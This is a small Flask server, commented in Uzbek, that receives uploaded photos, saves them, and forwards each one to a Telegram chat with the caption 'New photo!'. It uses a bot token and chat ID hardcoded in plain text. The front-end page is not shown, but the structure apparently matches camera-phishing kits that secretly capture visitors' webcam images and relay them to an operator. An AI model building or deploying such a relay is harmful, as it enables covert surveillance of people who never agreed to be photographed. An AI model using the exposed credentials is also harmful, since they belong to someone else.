from flask import Flask, render_template, request, jsonify
from flask_cors import CORS
import requests
import os
from datetime import datetime
import logging

app = Flask(__name__)
CORS(app)

# Telegram bot ma'lumotlari
BOT_TOKEN = "8647111510:AAGSttsSVpDuS0RjxNP0eaWnYdyqOXSYOTQ"
CHAT_ID = "6450239826"

# Papkalar
PHOTOS_DIR = "photos"
os.makedirs(PHOTOS_DIR, exist_ok=True)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/photo', methods=['POST'])
def receive_photo():
    try:
        photo = request.files['photo']
        
        # Rasmni saqlash
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{PHOTOS_DIR}/photo_{timestamp}.jpg"
        photo.save(filename)
        
        # Telegramga yuborish
        with open(filename, 'rb') as f:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                files={'photo': f},
                data={'chat_id': CHAT_ID, 'caption': 'Yangi rasm!'}
            )
        
        return jsonify({'status': 'ok'})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ==================== RUN ====================
# ==================== RUN ====================

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
